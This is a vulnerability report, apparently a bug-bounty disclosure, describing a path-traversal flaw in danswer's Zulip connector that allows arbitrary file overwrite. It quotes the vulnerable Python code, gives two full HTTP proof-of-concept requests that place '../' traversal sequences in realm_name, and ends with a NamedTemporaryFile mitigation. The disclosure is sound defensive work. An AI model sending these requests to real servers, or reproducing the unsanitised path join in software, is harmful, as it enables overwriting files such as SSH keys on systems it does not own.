## Description

In `danswer-ai/danswer`; Users are allowed to create custom `Connector` (`integrations` to third-party application such as `google drive`, `Github`); `Connector` `Zulip` -> `ZulipConnector` is a custom `Connector` for `Zuplip` integrations, However, in `load_credentials`, `danswer` connects `tempdir` with controllable `f"zuliprc-{self.realm_name}"` directly via `os.path.join(`, which is furthermore written with controllable content `contents_spaces_to_newlines` -> `contents.replace(" ", "\n")` -> `contents = credentials["zuliprc_content"]`; resulting Arbitrary File Overwrite / creation in case `zuliprc-` already exist in `/temp`.

## Source-to-Sink

#### `backend/danswer/connectors/zulip/connector.py` -> `class ZulipConnector(LoadConnector, PollConnector):` -> `load_credentials`

The source of the vulnerability derives from the user-controlled `credentials["zuliprc_content"]`. This value is directly fetched from the `credentials` dictionary passed to the `load_credentials` method; then replaced spaces with newlines in the `contents` string. the target path for `contents_spaces_to_newlines`, nevertheless, is directly joined from `tempdir` to a user-controllable format string `f"zuliprc-{self.realm_name}"`. This allowed attackers to construct path similar to `{tempdir}/zuliprc-xxxxx/../../../../../../../../../../.ssh` from `realm_name -> xxxxx/../../../../../../../../../../.ssh` during cases that `zuliprc-xxxxx` was created from previous creation; resulting Arbitrary File Overwrite, and Arbitrary File create when file does not exists

```python
class ZulipConnector(LoadConnector, PollConnector):
    def __init__(
        self, realm_name: str, realm_url: str, batch_size: int = INDEX_BATCH_SIZE
    ) -> None:
        self.batch_size = batch_size
        self.realm_name = realm_name
        self.realm_url = realm_url if realm_url.endswith("/") else realm_url + "/"
        self.client: Client | None = None

    def load_credentials(self, credentials: dict[str, Any]) -> dict[str, Any] | None:
        contents = credentials["zuliprc_content"]
        # The input field converts newlines to spaces in the provided
        # zuliprc file. This reverts them back to newlines.
        contents_spaces_to_newlines = contents.replace(" ", "\n")
        # create a temporary zuliprc file
        tempdir = tempfile.tempdir
        if tempdir is None:
            raise Exception("Could not determine tempfile directory")
        config_file = os.path.join(tempdir, f"zuliprc-{self.realm_name}")
        with open(config_file, "w") as f:
            f.write(contents_spaces_to_newlines)
        self.client = Client(config_file=config_file)
        return None

```

### Exploitation

1. By providing specific content in `credentials["zuliprc_content"]`, the attacker can control the contents of the file that is being written; which is previously inputted as `Provide Credentials`
    
    ```yaml
    POST /api/manage/credential HTTP/1.1
    Host: localhost:3000
    Content-Length: 81
    sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
    sec-ch-ua-platform: "Windows"
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
    Content-Type: application/json
    Accept: */*
    Origin: http://localhost:3000
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://localhost:3000/admin/connectors/zulip
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ajs_anonymous_id=51eb7ea5-b31a-4838-8379-0b8286352b8e; documentSidebarWidth=179
    Connection: close
    
    {"credential_json":{"zuliprc_content":"<ARBITRARY_PAYLOAD>"},"admin_public":true}
    ```
    

2. By providing a specific `realm_name`, an attacker can control the filename of the temporary file. For example, if `realm_name` is `../../existingfile`, the constructed path could overwrite or create a file outside the intended temporary directory.
    
    ```yaml
    POST /api/manage/admin/connector HTTP/1.1
    Host: localhost:3000
    Content-Length: 337
    sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
    sec-ch-ua-platform: "Windows"
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
    Content-Type: application/json
    Accept: */*
    Origin: http://localhost:3000
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://localhost:3000/admin/connectors/zulip
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ajs_anonymous_id=51eb7ea5-b31a-4838-8379-0b8286352b8e; documentSidebarWidth=179
    Connection: close
    
    {"name":"ZulipConnector-<EXISTING_SUBFIX>/../../../../../../.../../../../../../<ABITRARY_LOCATION>","source":"zulip","input_type":"poll","connector_specific_config":{"realm_name":"<EXISTING_SUBFIX>/../../../../../../.../../../../../../<ABITRARY_LOCATION>","realm_url":"<ARBITRARY>"},"refresh_freq":600,"prune_freq":null,"disabled":false}
    ```
    

The file `<EXISTING_SUBFIX>/../../../../../../.../../../../../../<ABITRARY_LOCATION>` will be created after few seconds of the second request.

## Mitigation

To mitigate this vulnerability, consider using a safe temporary file creation method such as `tempfile.NamedTemporaryFile` which ensures the file is created in a secure manner:

```python
import tempfile

class ZulipConnector(LoadConnector, PollConnector):
    def __init__(
        self, realm_name: str, realm_url: str, batch_size: int = INDEX_BATCH_SIZE
    ) -> None:
        self.batch_size = batch_size
        self.realm_name = realm_name
        self.realm_url = realm_url if realm_url.endswith("/") else realm_url + "/"
        self.client: Client | None = None

    def load_credentials(self, credentials: dict[str, Any]) -> dict[str, Any] | None:
        contents = credentials["zuliprc_content"]
        contents_spaces_to_newlines = contents.replace(" ", "\n")

        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_file.write(contents_spaces_to_newlines.encode('utf-8'))
            temp_file.flush()
            self.client = Client(config_file=temp_file.name)

        return None
```

By using `tempfile.NamedTemporaryFile`, the temporary file is securely created, reducing the risk of arbitrary file overwrite or creation.

# Impact

Arbitrary File Overwrite
